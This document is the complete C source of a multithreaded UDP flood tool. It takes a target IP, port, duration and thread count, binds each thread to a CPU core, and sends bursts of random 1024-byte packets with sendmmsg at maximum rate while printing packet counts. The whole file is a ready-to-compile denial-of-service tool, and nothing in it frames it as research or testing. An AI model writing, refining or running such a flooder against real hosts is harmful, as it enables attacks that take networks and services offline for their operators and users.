#define _GNU_SOURCE  // Required for CPU affinity and sendmmsg
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <stdatomic.h>
#include <signal.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

#define PAYLOAD_SIZE 1024         // Fixed payload size
#define STATS_INTERVAL 1          // Print stats every second
#define BURST_SIZE 50             // Fixed burst size for sendmmsg (hard-coded)

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int cpu_id;      // CPU core to bind this thread to
} thread_args;

_Atomic long total_sent = 0;
_Atomic long total_errors = 0;
volatile sig_atomic_t running = 1;

void int_handler(int sig) {
    running = 0;
}

void generate_payload(char *buffer, size_t size) {
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (!urandom || fread(buffer, 1, size, urandom) != size) {
        perror("Payload generation failed");
        exit(EXIT_FAILURE);
    }
    fclose(urandom);
}

void *send_payload(void *arg) {
    thread_args *args = (thread_args *)arg;
    char payload[PAYLOAD_SIZE];
    struct sockaddr_in target_addr;
    int sockfd;
    time_t start_time;

    // Bind thread to a specific CPU core
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(args->cpu_id, &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np failed");
    }

    generate_payload(payload, PAYLOAD_SIZE);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    if (inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sockfd);
        pthread_exit(NULL);
    }

    // Increase socket send buffer size
    int buf_size = 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size)) < 0) {
        perror("Failed to set socket send buffer size");
    }

    // Prepare fixed burst messages for sendmmsg
    int burst = BURST_SIZE;
    struct mmsghdr msgs[burst];
    struct iovec iovecs[burst];
    memset(msgs, 0, sizeof(msgs));
    for (int i = 0; i < burst; i++) {
        iovecs[i].iov_base = payload;
        iovecs[i].iov_len = PAYLOAD_SIZE;
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &target_addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(target_addr);
    }

    start_time = time(NULL);
    while (running && (time(NULL) - start_time < args->duration)) {
        int ret = sendmmsg(sockfd, msgs, burst, 0);
        if (ret < 0) {
            atomic_fetch_add(&total_errors, burst);
        } else {
            atomic_fetch_add(&total_sent, ret);
        }
    }

    close(sockfd);
    pthread_exit(NULL);
}

void print_stats(int duration) {
    time_t start = time(NULL);
    while (running) {
        sleep(STATS_INTERVAL);
        int elapsed = (int)(time(NULL) - start);
        int remaining = duration - elapsed;
        printf("\r[%02d:%02d] Packets: %ld  Errors: %ld  ",
               remaining / 60, remaining % 60,
               atomic_load(&total_sent),
               atomic_load(&total_errors));
        fflush(stdout);
        if (elapsed >= duration)
            running = 0;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: s <IP> <PORT> <DURATION_SECONDS> <THREADS>\n");
        return EXIT_FAILURE;
    }

    struct sigaction sa = { .sa_handler = int_handler };
    sigaction(SIGINT, &sa, NULL);

    char target_ip[16];
    strncpy(target_ip, argv[1], 15);
    target_ip[15] = '\0';
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    thread_args *args = malloc(thread_count * sizeof(thread_args));
    if (!threads || !args) {
        perror("Memory allocation failed");
        free(threads);
        free(args);
        return EXIT_FAILURE;
    }

    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    for (int i = 0; i < thread_count; i++) {
        strncpy(args[i].target_ip, target_ip, 15);
        args[i].target_ip[15] = '\0';
        args[i].target_port = target_port;
        args[i].duration = duration;
        args[i].cpu_id = i % num_cpus;  // Distribute threads evenly across available CPUs

        if (pthread_create(&threads[i], NULL, send_payload, &args[i]) != 0) {
            perror("Thread creation failed");
            running = 0;
            for (int j = 0; j < i; j++) {
                pthread_join(threads[j], NULL);
            }
            free(threads);
            free(args);
            return EXIT_FAILURE;
        }
    }

    printf("Starting UDP flood to %s:%d for %d seconds using %d threads\n",
           target_ip, target_port, duration, thread_count);

    print_stats(duration);

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\nFinal results:\n");
    printf("Total packets sent: %ld\n", atomic_load(&total_sent));
    printf("Total errors: %ld\n", atomic_load(&total_errors));

    free(threads);
    free(args);
    return EXIT_SUCCESS;
}
